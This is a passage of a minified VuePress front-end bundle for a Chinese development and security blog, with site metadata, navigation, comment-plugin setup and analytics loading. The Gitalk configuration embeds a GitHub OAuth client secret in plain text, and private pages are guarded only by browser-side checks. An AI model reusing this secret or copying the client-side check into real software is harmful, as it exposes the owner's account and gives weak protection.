ddd.com"},categories:["安全开发","Python"],tags:["Python"]},{name:"Python模块化的那些事",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.安全/202.安全开发/2020.Python/07.Python模块化的那些事.md",wordsCount:"3k",readingTime:"11.3m",title:"Python模块化的那些事",date:"2022-03-27T22:00:00.000Z",permalink:"/sec/dev/python/module",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["安全开发","Python"],tags:["Python"]},{name:"Python多线程的那些事",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.安全/202.安全开发/2020.Python/08.Python多线程的那些事.md",wordsCount:"7.8k",readingTime:"31.7m",title:"Python多线程的那些事",date:"2022-03-28T09:00:00.000Z",permalink:"/sec/dev/python/thread",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["安全开发","Python"],tags:["Python"]},{name:"Go语言基础语法",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.安全/202.安全开发/2021.Go/00.Go语言基础语法.md",wordsCount:"5.5k",readingTime:"23m",title:"Go语言基础语法",date:"2022-04-07T21:00:00.000Z",permalink:"/sec/dev/go/basicgrammar",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["安全开发","Go"],tags:["Go"]},{name:"jar打包为app",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.安全/203.奇淫巧技/2030.小工具/00.jar打包为app.md",wordsCount:"1.2k",readingTime:"5.1m",title:"Jar打包为APP",date:"2022-04-20T21:00:00.000Z",permalink:"/sec/skill/jar2app",author:{name:"NineRiverSec",link:"https://github.com/NineRiverSec"},categories:["奇淫巧技","小工具"],tags:["Tools"]},{name:"picocli",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.安全/203.奇淫巧技/2030.小工具/01.picocli.md",wordsCount:"10.3k",readingTime:"44.6m",title:"Java Picocli Quick Start",date:"2022-04-26T03:00:00.000Z",permalink:"/sec/skill/picocli-quick-start",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["奇淫巧技","小工具"],tags:["Java","CLI","Tools"]},{name:"Java代码审计CheckList",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.安全/204.代码审计/00.Java代码审计CheckList.md",wordsCount:"9.1k",readingTime:"33m",title:"Java代码审计CheckList",date:"2022-07-26T15:00:00.000Z",permalink:"/sec/codereview/javachecklist",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["代码审计"],tags:["Java","代码审计"]},{name:"天气炎热开个空调吧",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/03.生活/300.其他/01.天气炎热开个空调吧.md",wordsCount:79,readingTime:"1",title:"天气炎热，小站空调已开放！",date:"2022-06-23T00:00:00.000Z",permalink:"/life/other/airconditioning",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","前端","前端基础"],sidebar:!1,article:!1,tags:["HTML","CSS"]},{name:"emoji",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/04.更多/400.博客搭建/00.emoji.md",wordsCount:904,readingTime:"5.6m",title:"Emoji表情集合",date:"2000-01-01T00:00:00.000Z",permalink:"/more/blog/emoji",categories:["更多","博客搭建"],tags:[null]},{name:"私密文章测试",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/04.更多/400.博客搭建/01.私密文章测试.md",wordsCount:210,readingTime:"1",title:"私密文章测试",date:"2022-05-14T08:14:22.000Z",permalink:"/more/blog/privatepage",categories:["更多","博客搭建"],tags:[null]},{name:"关于",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/05.关于/01.关于.md",wordsCount:792,readingTime:"3.9m",title:"AboutME",date:"2019-12-25T14:27:01.000Z",permalink:"/about",sidebar:!1,article:!1}],mdFileCountType:"archives",totalWords:"archives",moutedEvent:".tags-wrapper",indexIteration:2500,pageIteration:2500},bodyBgImg:"https://wiki-1251603812.cos.ap-shanghai.myqcloud.com/images/bg.jpeg",bodyBgImgOpacity:1,contentBgStyle:1,sidebar:{"/00.目录页/":[{title:"导航栏",collapsable:!0,children:[["00.导航栏/01.开发.md","开发","/dev/"],["00.导航栏/02.安全.md","安全","/sec/"],["00.导航栏/03.生活.md","生活","/life/"],["00.导航栏/04.更多.md","更多","/more/"]]},{title:"开发",collapsable:!0,children:[["01.开发/00.前端.md","前端","/dev/web/"],["01.开发/01.后端.md","后端","/dev/java/"],["01.开发/02.计算机基础.md","计算机基础","/dev/basic/"]]},{title:"安全",collapsable:!0,children:[["02.安全/00.静态分析.md","静态分析","/sec/sa/"],["02.安全/01.漏洞原理.md","漏洞原理","/sec/vuln/"],["02.安全/02.安全开发.md","安全开发","/sec/dev/"],["02.安全/03.奇淫巧技.md","奇淫巧技","/sec/skill/"]]},{title:"更多",collapsable:!0,children:[["04.更多/00.博客搭建.md","博客搭建","/more/blog/"]]}],catalogue:{"开发":"/dev/","安全":"/sec/","生活":"/life/","更多":"/more/","前端":"/dev/web/","后端":"/dev/java/","计算机基础":"/dev/basic/","静态分析":"/sec/sa/","漏洞原理":"/sec/vuln/","安全开发":"/sec/dev/","奇淫巧技":"/sec/skill/","博客搭建":"/more/blog/"},"/01.开发/":[{title:"前端",collapsable:!0,children:[{title:"前端基础",collapsable:!0,children:[["100.前端/1000.前端基础/00. HTML&CSS基础.md","HTML&CSS基础","/dev/web/basis/htmlandcss"]]}]},{title:"后端",collapsable:!0,children:[{title:"微服务核心",collapsable:!0,children:[["101.后端/1011.微服务核心/00.Spring5.md","Spring5","/dev/java/core/spring5"],["101.后端/1011.微服务核心/01.SpringMVC.md","SpringMVC","/dev/java/core/springmvc"],["101.后端/1011.微服务核心/02.Mybatis.md","MyBatis","/dev/java/core/mybatis"],["101.后端/1011.微服务核心/03.MyBatisPlus.md","MyBatis-Plus","/dev/java/core/mybatisplus"],["101.后端/1011.微服务核心/04.SSM.md","SSM","/dev/java/core/ssm"],["101.后端/1011.微服务核心/05.Springboot.md","Springboot1 基础篇","/dev/java/core/springbootbase"]]},{title:"微服务生态",collapsable:!0,children:[["101.后端/1012.微服务生态/00.Docker.md","Docker","/dev/java/eco/docker"],["101.后端/1012.微服务生态/01.SpringSecurity.md","Spring Security","/dev/java/eco/springsecurity"],["101.后端/1012.微服务生态/02.Shiro.md","Shiro","/dev/java/eco/shiro"]]},{title:"项目实战",collapsable:!0,children:[["101.后端/1013.项目实战/00.尚筹网.md","尚筹网","/dev/java/project/cf"],["101.后端/1013.项目实战/01.代码片段.md","代码片段集合","/dev/java/project/code"]]}]},{title:"计算机基础",collapsable:!0,children:[{title:"数据结构与算法",collapsable:!0,children:[["102.计算机基础/1020.数据结构与算法/00.概述.md","【数据结构】概述","/dev/basic/ds/introduction"],["102.计算机基础/1020.数据结构与算法/01.线性表.md","【数据结构】线性表","/dev/basic/ds/list"]]},{title:"计算机网络",collapsable:!0,children:[["102.计算机基础/1021.计算机网络/00.概述.md","【计算机网络】概述","/dev/basic/network/introduction"],["102.计算机基础/1021.计算机网络/01.物理层.md","【计算机网络】物理层","/dev/basic/network/physicallayer"]]}]}],"/02.安全/":[{title:"静态分析",collapsable:!0,children:[{title:"南京大学课程笔记",collapsable:!0,children:[["200.静态分析/2000.南京大学课程笔记/00.Introduction.md","SA - Introduction","/sec/sa/nju/introduction"],["200.静态分析/2000.南京大学课程笔记/01.IR.md","SA - IR","/sec/sa/nju/ir"],["200.静态分析/2000.南京大学课程笔记/02.DFA-Applications.md","SA - DFA-Applications","/sec/sa/nju/dfaapplications"],["200.静态分析/2000.南京大学课程笔记/03.DFA-Foundations.md","SA - DFA-Foundations","/sec/sa/nju/dfafoundations"]]},{title:"CodeQL",collapsable:!0,children:[["200.静态分析/2001.CodeQL/00. CodeQL - UBoot练习项目（上）.md","CodeQL - UBoot练习项目（上）","/sec/sa/codeql/uboot1"],["200.静态分析/2001.CodeQL/01. CodeQL - UBoot练习项目（下）.md","CodeQL - UBoot练习项目（下）","/sec/sa/codeql/uboot2"],["200.静态分析/2001.CodeQL/02. CodeQL从入门到放弃.md","CodeQL从入门到放弃","/sec/sa/codeql/codeqlstep0to1"]]}]},{title:"漏洞原理",collapsable:!0,children:[{title:"反序列化漏洞",collapsable:!0,children:[["201.漏洞原理/2010.反序列化漏洞/00.反序列化原理-反射.md","反序列化漏洞原理 - 反射","/sec/vuln/deserialization/reflaction","原创"],["201.漏洞原理/2010.反序列化漏洞/01.URLDNS分析.md","URLDNS链分析","/sec/vuln/deserialization/urldns","原创"],["201.漏洞原理/2010.反序列化漏洞/02.CC1分析.md","CC1分析","/sec/vuln/deserialization/cc1","原创"],["201.漏洞原理/2010.反序列化漏洞/03.CC6分析.md","CC6分析","/sec/vuln/deserialization/cc6","原创"],["201.漏洞原理/2010.反序列化漏洞/04.反序列化原理-反序列化.md","反序列化漏洞原理 - 反序列化","/sec/vuln/deserialization/serialization","原创"]]}]},{title:"安全开发",collapsable:!0,children:[{title:"Python",collapsable:!0,children:[["202.安全开发/2020.Python/00.Python字符串的那些事.md","Python字符串的那些事","/sec/dev/python/pystring"],["202.安全开发/2020.Python/01.Python序列的那些事.md","Python序列的那些事","/sec/dev/python/sequence"],["202.安全开发/2020.Python/02.Python流程控制的那些事.md","Python流程控制的那些事","/sec/dev/python/process"],["202.安全开发/2020.Python/03.Python函数的小秘密.md","Python函数的小秘密","/sec/dev/python/func"],["202.安全开发/2020.Python/04.Python面向对象的那些事.md","Python面向对象的那些事","/sec/dev/python/oop"],["202.安全开发/2020.Python/05.Python异常处理的那些事.md","Python异常处理的那些事","/sec/dev/python/exception"],["202.安全开发/2020.Python/06.Python文件操作的那些事.md","Python文件操作的那些事","/sec/dev/python/file"],["202.安全开发/2020.Python/07.Python模块化的那些事.md","Python模块化的那些事","/sec/dev/python/module"],["202.安全开发/2020.Python/08.Python多线程的那些事.md","Python多线程的那些事","/sec/dev/python/thread"]]},{title:"Go",collapsable:!0,children:[["202.安全开发/2021.Go/00.Go语言基础语法.md","Go语言基础语法","/sec/dev/go/basicgrammar"]]}]},{title:"奇淫巧技",collapsable:!0,children:[{title:"小工具",collapsable:!0,children:[["203.奇淫巧技/2030.小工具/00.jar打包为app.md","Jar打包为APP","/sec/skill/jar2app"],["203.奇淫巧技/2030.小工具/01.picocli.md","Java Picocli Quick Start","/sec/skill/picocli-quick-start"]]}]},{title:"代码审计",collapsable:!0,children:[["204.代码审计/00.Java代码审计CheckList.md","Java代码审计CheckList","/sec/codereview/javachecklist"]]}],"/03.生活/":[{title:"其他",collapsable:!0,children:[["300.其他/01.天气炎热开个空调吧.md","天气炎热，小站空调已开放！","/life/other/airconditioning"]]}],"/04.更多/":[{title:"博客搭建",collapsable:!0,children:[["400.博客搭建/00.emoji.md","Emoji表情集合","/more/blog/emoji"],["400.博客搭建/01.私密文章测试.md","私密文章测试","/more/blog/privatepage"]]}],"/05.关于/":[["01.关于.md","AboutME","/about"]]},author:{name:"p0jo",link:"https://github.com/p0josec"},blogger:{avatar:"https://wiki-1251603812.cos.ap-shanghai.myqcloud.com/images/avatar.jpg",name:"p0jo",slogan:"欲变世界，先变自己。"},social:{icons:[{iconClass:"icon-youjian",title:"发邮件",link:"mailto:p0josec@gmail.com"},{iconClass:"icon-github",title:"GitHub",link:"https://github.com/p0josec"},{iconClass:"icon-erji",title:"听音乐",link:"https://music.163.com/#/playlist?id=755597173"}]},footer:{createYear:2022,copyrightInfo:'Vuepress-theme-Vdoing | <a href="https://github.com/xugaoyi/vuepress-theme-vdoing/blob/master/LICENSE" target="_blank">MIT License</a>'},htmlModules:{homeSidebarB:'<div style="padding: 0.95rem">\n    <br>\n    <p style="\n      color: var(--textColor);\n      opacity: 0.9;\n      font-size: 20px;\n      font-weight: bold;\n      margin: 0 0 8px 0;\n    ">公众号</p>\n    <img src="https://wiki-1251603812.cos.ap-shanghai.myqcloud.com/images/wechat.png" style="width:100%"/>\n    <p>\n    <br>\n    公众号间歇性更新中，感谢关注～\n    </p>\n    </div>'}},locales:{"/":{lang:"zh-CN",title:"上校的玩具间",description:"坐而言不如起而行。js,java,vue,Spring,html5,Node,git,github,CodeQL等技术文章。",path:"/"}}};t(261);let wl;function kl(n){var e=document.querySelector(n);e&&e.parentNode.removeChild(e)}function _l(n,e=".articleInfo-wrap > .articleInfo > .info"){var t=0;let r=setInterval(()=>{t++;const a=document.querySelector(e);a?function(n,e){return n.parentNode==e}(n,a)||(a.appendChild(n),clearInterval(r)):t>10&&clearInterval(r)},1e3)}var Sl=t(98),jl=t(99),Cl=t(12);var Il={computed:{$filterPosts(){return this.$site.pages.filter(n=>{const{frontmatter:{pageComponent:e,article:t,home:r}}=n;return!(e||!1===t||!0===r)})},$sortPosts(){return(n=this.$filterPosts).sort((n,e)=>{const t=n.frontmatter.sticky,r=e.frontmatter.sticky;return t&&r?t==r?Object(Cl.a)(n,e):t-r:t&&!r?-1:!t&&r?1:Object(Cl.a)(n,e)}),n;var n},$sortPostsByDate(){return(n=this.$filterPosts).sort((n,e)=>Object(Cl.a)(n,e)),n;var n},$groupPosts(){return function(n){const e={},t={};for(let r=0,a=n.length;r<a;r++){const{frontmatter:{categories:a,tags:i}}=n[r];"array"===Object(Cl.n)(a)&&a.forEach(t=>{t&&(e[t]||(e[t]=[]),e[t].push(n[r]))}),"array"===Object(Cl.n)(i)&&i.forEach(e=>{e&&(t[e]||(t[e]=[]),t[e].push(n[r]))})}return{categories:e,tags:t}}(this.$sortPosts)},$categoriesAndTags(){return function(n){const e=[],t=[];for(let t in n.categories)e.push({key:t,length:n.categories[t].length});for(let e in n.tags)t.push({key:e,length:n.tags[e].length});return{categories:e,tags:t}}(this.$groupPosts)}}};Gt.component(Sl.default),Gt.component(jl.default);function Tl(n){return n.toString().padStart(2,"0")}t(249);Gt.component("Card",()=>Promise.all([t.e(0),t.e(3)]).then(t.bind(null,344))),Gt.component("IndexBigImg",()=>Promise.all([t.e(0),t.e(4)]).then(t.bind(null,345))),Gt.component("Login",()=>Promise.resolve().then(t.bind(null,261))),Gt.component("WebInfo",()=>Promise.all([t.e(0),t.e(5)]).then(t.bind(null,341))),Gt.component("Badge",()=>Promise.all([t.e(0),t.e(6)]).then(t.bind(null,408))),Gt.component("CodeBlock",()=>Promise.resolve().then(t.bind(null,98))),Gt.component("CodeGroup",()=>Promise.resolve().then(t.bind(null,99)));t(250);var El={name:"ReadingProgress",data:()=>({readingTop:0,readingHeight:1,progressStyle:null,transform:void 0,running:!1}),watch:{$readingShow(){this.progressStyle=this.getProgressStyle(),this.$readingShow&&window.addEventListener("scroll",this.base)}},mounted(){this.transform=this.getTransform(),this.progressStyle=this.getProgressStyle(),this.$readingShow&&window.addEventListener("scroll",this.base)},beforeDestroy(){this.$readingShow&&window.removeEventListener("scroll",this.base)},methods:{base(){this.running||(this.running=!0,requestAnimationFrame(this.getReadingBase))},getReadingBase(){this.readingHeight=this.getReadingHeight()-this.getScreenHeight(),this.readingTop=this.getReadingTop(),this.progressStyle=this.getProgressStyle(),this.running=!1},getReadingHeight:()=>Math.max(document.body.scrollHeight,document.body.offsetHeight,0),getScreenHeight:()=>Math.max(window.innerHeight,document.documentElement.clientHeight,0),getReadingTop:()=>Math.max(window.pageYOffset,document.documentElement.scrollTop,0),getTransform(){const n=document.createElement("div");return["transform","-webkit-transform","-moz-transform","-o-transform","-ms-transform"].find(e=>e in n.style)||void 0},getProgressStyle(){const n=this.readingTop/this.readingHeight;switch(this.$readingShow){case"top":case"bottom":return this.transform?`${this.transform}: scaleX(${n})`:`width: ${100*n}%`;case"left":case"right":return this.transform?`${this.transform}: scaleY(${n})`:`height: ${100*n}%`;default:return null}}}},Al=(t(251),Object(bl.a)(El,(function(){var n=this._self._c;return n("ClientOnly",[this.$readingShow?n("div",{staticClass:"reading-progress",class:this.$readingShow},[n("div",{staticClass:"progress",style:this.progressStyle})]):this._e()])}),[],!1,null,"3640397f",null).exports),zl=(t(252),t(97)),ql=t.n(zl),Ml=t(27);let Pl,Ll;var Rl;"valine"===(Rl="gitalk")?t.e(73).then(t.t.bind(null,337,7)).then(n=>Ll=n.default):"gitalk"===Rl&&Promise.all([t.e(0),t.e(72)]).then(t.t.bind(null,338,7)).then(()=>t.e(71).then(t.t.bind(null,339,7))).then(n=>Pl=n.default);function Ol(n,e){const t={};return Reflect.ownKeys(n).forEach(r=>{if("string"==typeof n[r])try{t[r]=ql.a.render(n[r],e)}catch(e){console.warn(`Comment config option error at key named "${r}"`),console.warn("More info: "+e.message),t[r]=n[r]}else t[r]=n[r]}),t}console.log(`How to use "gitalk" in ${Ml.name}@v${Ml.version}:`,Ml.homepage);const Dl={gitalk:{render(n,e){const t=document.createElement("div");t.id=e;document.querySelector("main.page").appendChild(t);new Pl(Ol({clientID:"ce8d24a63bb0c5701685",clientSecret:"e6b33c9d3e857f675b3bb34a1c491b323325b49d",repo:"WikiTalk",owner:"p0josec",admin:["p0josec"],distractionFreeMode:!0,pagerDirection:"last",id:"<%- (frontmatter.permalink || frontmatter.to.path).slice(-16) %>",title:"「评论」<%- frontmatter.title %>",labels:["Gitalk","Comment"],body:"页面：<%- window.location.origin + (frontmatter.to.path || window.location.pathname) %>"},{frontmatter:n})).render(e)},clear(n){const e=document.querySelector("#"+n);return e&&e.remove(),!0}},valine:{render(n,e){const t=document.createElement("div");t.id=e;document.querySelector("main.page").appendChild(t),new Ll({...Ol({clientID:"ce8d24a63bb0c5701685",clientSecret:"e6b33c9d3e857f675b3bb34a1c491b323325b49d",repo:"WikiTalk",owner:"p0josec",admin:["p0josec"],distractionFreeMode:!0,pagerDirection:"last",id:"<%- (frontmatter.permalink || frontmatter.to.path).slice(-16) %>",title:"「评论」<%- frontmatter.title %>",labels:["Gitalk","Comment"],body:"页面：<%- window.location.origin + (frontmatter.to.path || window.location.pathname) %>"},{frontmatter:n}),el:"#"+e})},clear(n){const e=document.querySelector("#"+n);return e&&e.remove(),!0}}},Bl="vuepress-plugin-comment";let Ul=null;function Fl(n){return Dl.gitalk.clear(Bl)}function Nl(n){return!1!==n.comment&&!1!==n.comments}function Hl(n){clearTimeout(Ul);if(document.querySelector("main.page"))return Dl.gitalk.render(n,Bl);Ul=setTimeout(()=>Hl(n),200)}var $l={mounted(){Ul=setTimeout(()=>{const n={to:{},from:{},...this.$frontmatter};Fl()&&Nl(n)&&Hl(n)},1e3),this.$router.afterEach((n,e)=>{if(n&&e&&n.path===e.path)return;const t={to:n,from:e,...this.$frontmatter};Fl()&&Nl(t)&&Hl(t)})}},Vl=Object(bl.a)($l,(function(){return(0,this._self._c)("div")}),[],!1,null,null,null).exports,Gl=[({Vue:n,options:e,router:r,siteData:a,isServer:i})=>{i||r.beforeEach((n,e,t)=>{a.pages.forEach(e=>{if(e.path==n.path&&e.frontmatter.private&&1==e.frontmatter.private&&a.themeConfig.privatePage){let{username:t,password:i,loginPath:o,loginKey:s,expire:l,loginSession:c}=a.themeConfig.privatePage;if(l||(l=864e5),s||(s="vdoing_login"),c&&window.addEventListener("unload",(function(){localStorage.removeItem(s)})),e.frontmatter.username&&e.frontmatter.password){let t=JSON.parse(localStorage.getItem(e.frontmatter.title));(!t||t.username!==e.frontmatter.username&&t.password!==e.frontmatter.password)&&r.push({path:o,query:{toPath:n.path,singlePage:!0}})}else{let e=JSON.parse(localStorage.getItem(s));!e||e.username!==t&&e.password!==i?r.push({path:o,query:{toPath:n.path}}):new Date-e.time>e.expire&&(localStorage.removeItem(s),r.push({path:o,query:{toPath:n.path}}))}}}),t()}),i||r.beforeEach((n,e,r)=>{r(),"/"!==n.path&&n.path!==e.path&&a.themeConfig.blogInfo&&(kl(".page-view-js"),kl(".page-view"),kl(".book-words"),kl(".reading-time"),a.pages.forEach(e=>{if(e.path==n.path&&(null==e.frontmatter.article||e.frontmatter.article)){const{eachFileWords:n,pageView:r,pageIteration:i,readingTime:o}=a.themeConfig.blogInfo;return n&&n.forEach(n=>{n.permalink==e.frontmatter.permalink&&(function(n){if(n){let e=document.createElement("div");e.title="文章字数",e.className="book-words iconfont icon-book",e.style.float="left",e.style.marginLeft="20px",e.style.fontSize="0.8rem",e.innerHTML=`<a href="javascript:;" style="margin-left: 3px; color: #888">${n}</a>`,_l(e)}}(n.wordsCount),(o||null==o)&&function(n){let e=document.createElement("div");e.title="预阅读时长",e.className="reading-time iconfont icon-shijian",e.style.float="left",e.style.marginLeft="20px",e.style.fontSize="0.8rem",e.innerHTML=`<a href="javascript:;" style="margin-left: 3px; color: #888">${n}</a>`,_l(e)}(n.readingTime))}),void((r||null==r)&&(!function(){let n=document.createElement("div");n.title="浏览量",n.className="page-view iconfont icon-view",n.style.float="left",n.style.marginLeft="20px",n.style.fontSize="0.8rem",n.innerHTML='<a style="color: #888; margin-left: 3px" href="javascript:;" id="busuanzi_value_page_pv" class="view-data"><i title="正在获取..." class="loading iconfont icon-loading"></i></a>',_l(n);let e=document.createElement("style");e.innerHTML="@keyframes turn {\n    0% {\n      transform: rotate(0deg);\n    }\n    100% {\n      transform: rotate(360deg);\n    }\n  }\n  .loading {\n    display: inline-block;\n    animation: turn 1s linear infinite;\n    -webkit-animation: turn 1s linear infinite;\n  }",document.head.appendChild(e)}(),setTimeout(()=>{!function(n=3e3){wl?wl.fetch():wl=t(101);var e=0;setTimeout(()=>{let t=setInterval(()=>{const r=document.querySelector(".view-data");r?((e+=n)>10*n&&(r.innerText="9999",clearInterval(t)),""==r.innerText?wl.fetch():clearInterval(t)):clearInterval(t)},n)},n)}(i)},1500)))}}))})},({Vue:n,options:e,router:t,siteData:r})=>{r.pages.map(n=>{const{frontmatter:{date:e,author:t}}=n;"string"==typeof e&&"Z"===e.charAt(e.length-1)&&(n.frontmatter.date=function(n){n instanceof Date||(n=new Date(n));return`${n.getUTCFullYear()}-${Tl(n.getUTCMonth()+1)}-${Tl(n.getUTCDate())} ${Tl(n.getUTCHours())}:${Tl(n.getUTCMinutes())}:${Tl(n.getUTCSeconds())}`}(e)),t?n.author=t:r.themeConfig.author&&(n.author=r.themeConfig.author)}),n.mixin(Il)},{},({Vue:n})=>{n.mixin({computed:{$dataBlock(){return this.$options.__data__block__}}})},{},{},()=>{"undefined"!=typeof window&&function(n,e,t){function r(n){var t=e.createElement("div");t.className="heart",a.push({el:t,x:n.clientX-5,y:n.clientY-5,scale:1,alpha:1,color:"#11a8cd"}),e.body.appendChild(t)}var a=[];n.requestAnimationFrame=n.requestAnimationFrame||n.webkitRequestAnimationFrame||n.mozRequestAnimationFrame||n.oRequestAnimationFrame||n.msRequestAnimationFrame||function(n){setTimeout(n,1e3/60)},function(n){var t=e.createElement("style");t.type="text/css";try{t.appendChild(e.createTextNode(n))}catch(e){t.styleSheet.cssText=n}e.getElementsByTagName("head")[0].appendChild(t)}(".heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}"),function(){var e="function"==typeof n.onclick&&n.onclick;n.onclick=function(n){let t=!0;n.path&&n.path.forEach(n=>{1===n.nodeType&&"string"==typeof n.className&&n.className.indexOf("theme-vdoing-content")>-1&&(t=!1)}),t&&(e&&e(),r(n))}}(),function n(){for(var t=0;t<a.length;t++)a[t].alpha<=0?(e.body.removeChild(a[t].el),a.splice(t,1)):(a[t].y--,a[t].scale+=.004,a[t].alpha-=.013,a[t].el.style.cssText="left:"+a[t].x+"px;top:"+a[t].y+"px;opacity:"+a[t].alpha+";transform:scale("+a[t].scale+","+a[t].scale+") rotate(45deg);background:"+a[t].color+";z-index:99999");requestAnimationFrame(n)}()}(window,document)},({router:n})=>{"undefined"!=typeof window&&(window._hmt=window._hmt||[],function(){var n=document.createElement("script");n.src="https://hm.baidu.com/hm.js?0d7ce6cf5576081a22c4dc40b74a7840";var e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)}(),n.afterEach((function(n){_hmt.push(["_trackPageview",n.fullPath])})))},({Vue:n})=>{n.component(Al.name,Al),n.mixin({computed:{$readingShow(){return this.$page.frontmatter.readingShow}}})},({Vue:n})=>{n.component("Comment",Vl)}],Wl=["ReadingProgress","Comment"];class Jl extends class{constructor(){this.store=new Gt({data:{state:{}}})}$get(n){return this.store.state[n]}$set(n,e){Gt.set(this.store.state,n,e)}$emit(...n){this.store.$emit(...n)}$on(...n){this.store.$on(...n)}}{}Object.assign(Jl.prototype,{getPageAsyncComponent:os,getLayoutAsyncComponent:ss,getAsyncComponent:ls,getVueComponent:cs});var Ql={install(n){const e=new Jl;n.$vuepress=e,n.prototype.$vuepress=e}};function Xl(n,e){const t=e.toLowerCase();return n.options.routes.some(n=>n.path.toLowerCase()===t)}var Yl={props:{pageKey:String,slotKey:{type:String,default:"default"}},render(n){const e=this.pageKey||this.$parent.$page.key;return ds("pageKey",e),Gt.component(e)||Gt.component(e,os(e)),Gt.component(e)?n(e):n("")}},Zl={functional:!0,props:{slotKey:String,required:!0},render:(n,{props:e,slots:t})=>n("div",{class:["content__"+e.slotKey]},t()[e.slotKey])},Kl={computed:{openInNewWindowTitle(){return this.$themeLocaleConfig.openNewWindowText||"(opens new window)"}}},nc=(t(258),t(259),Object(bl.a)(Kl,(function(){var n=this._self._c;return n("span",[n("svg",{staticClass:"icon outbound",attrs:{xmlns:"http://www.w3.org/2000/svg","aria-hidden":"true",focusable:"false",x:"0px",y:"0px",viewBox:"0 0 100 100",width:"15",height:"15"}},[n("path",{attrs:{fill:"currentColor",d:"M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"}}),this._v(" "),n("polygon",{attrs:{fill:"currentColor",points:"45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"}})]),this._v(" "),n("span",{staticClass:"sr-only"},[this._v(this._s(this.openInNewWindowTitle))])])}),[],!1,null,null,null).exports),ec={functional:!0,render(n,{parent:e,children:t}){if(e._isMounted)return t;e.$once("hook:mounted",()=>{e.$forceUpdate()})}};Gt.config.productionTip=!1,Gt.use($o),Gt.use(Ql),Gt.mixin(function(n,e,t=Gt){!function(n){n.locales&&Object.keys(n.locales).forEach(e=>{n.locales[e].path=e});Object.freeze(n)}(e),t.$vuepress.$set("siteData",e);const r=new(n(t.$vuepress.$get("siteData"))),a=Object.getOwnPropertyDescriptors(Object.getPrototypeOf(r)),i={};return Object.keys(a).reduce((n,e)=>(e.startsWith("$")&&(n[e]=a[e].get),n),i),{computed:i}}(n=>class{setPage(n){this.__page=n}get $site(){return n}get $themeConfig(){return this.$site.themeConfig}get $frontmatter(){return this.$page.frontmatter}get $localeConfig(){const{locales:n={}}=this.$site;let e,t;for(const r in n)"/"===r?t=n[r]:0===this.$page.path.indexOf(r)&&(e=n[r]);return e||t||{}}get $siteTitle(){return this.$localeConfig.title||this.$site.title||""}get $canonicalUrl(){const{canonicalUrl:n}=this.$page.frontmatter;return"string"==typeof n&&n}get $title(){const n=this.$page,{metaTitle:e}=this.$page.frontmatter;if("string"==typeof e)return e;const t=this.$siteTitle,r=n.frontmatter.home?null:n.frontmatter.title||n.title;return t?r?r+" | "+t:t:r||"VuePress"}get $description(){const n=function(n){if(n){const e=n.filter(n=>"description"===n.name)[0];if(e)return e.content}}(this.$page.frontmatter.meta);return n||(this.$page.frontmatter.description||this.$localeConfig.description||this.$site.description||"")}get $lang(){return this.$page.frontmatter.lang||this.$localeConfig.lang||"en-US"}get $localePath(){return this.$localeConfig.path||"/"}get $themeLocaleConfig(){return(this.$site.themeConfig.locales||{})[this.$localePath]||{}}get $page(){return this.__page?this.__page:function(n,e){for(let t=0;t<n.length;t++){const r=n[t];if(r.path.toLowerCase()===e.toLowerCase())return r}return{path:"",frontmatter:{}}}(this.$site.pages,this.$route.path)}},xl)),Gt.component("Content",Yl),Gt.component("ContentSlotsDistributor",Zl),Gt.component("OutboundLink",nc),Gt.component("ClientOnly",ec),Gt.component("Layout",ss("Layout")),Gt.component("NotFound",ss("NotFound")),Gt.prototype.$withBase=function(n){const e=this.$site.base;return"/"===n.charAt(0)?e+n.slice(1):n},window.__VUEPRESS__={version:"1.9.5",hash:"dd3af70"},async function(n){const e="undefined"!=typeof window&&window.__VUEPRESS_ROUTER_BASE__?window.__VUEPRESS_ROUTER_BASE__:xl.routerBase||xl.base,t=new $o({base:e,mode:"history",fallback:!1,routes:yl,scrollBehavior:(n,e,t)=>t||(n.hash?!Gt.$vuepress.$get("disableScrollBehavior")&&{selector:decodeURIComponent(n.hash)}:{x:0,y:0})});!function(n){n.beforeEach((e,t,r)=>{if(Xl(n,e.path))r();else if(/(\/|\.html)$/.test(e.path))if(/\/$/.test(e.path)){const t=e.path.replace(/\/$/,"")+".html";Xl(n,t)?r(t):r()}else r();else{const t=e.path+"/",a=e.path+".html";Xl(n,a)?r(a):Xl(n,t)?r(t):r()}})}(t);const r={};try{await Promise.all(Gl.filter(n=>"function"==typeof n).map(e=>e({Vue:Gt,options:r,router:t,siteData:xl,isServer:n})))}catch(n){console.error(n)}return{app:new Gt(Object.assign(r,{router:t,render:n=>n("div",{attrs:{id:"app"}},[n("RouterView",{ref:"layout"}),n("div",{class:"global-ui"},Wl.map(e=>n(e)))])})),router:t}}(!1).then(({app:n,router:e})=>{e.onReady(()=>{n.$mount("#app")})})},function(n,e,t){"use strict";t.r(e);t(9);function r(n,e,t=50,r=3e3){var a=document.querySelectorAll(".private-tip"),i=(new 